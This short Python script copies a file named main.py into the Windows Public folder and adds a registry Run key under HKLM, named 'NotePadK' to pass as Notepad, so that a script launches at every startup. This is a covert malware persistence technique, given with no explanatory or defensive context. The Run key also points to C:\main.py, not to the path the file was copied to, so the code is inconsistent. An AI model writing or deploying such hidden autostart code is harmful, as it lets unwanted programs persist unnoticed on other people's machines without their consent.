import os

os.system('copy main.py C:\Users\Public\main.py')
os.system(r'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "NotePadK" /t REG_SZ /d "C:\main.py"')
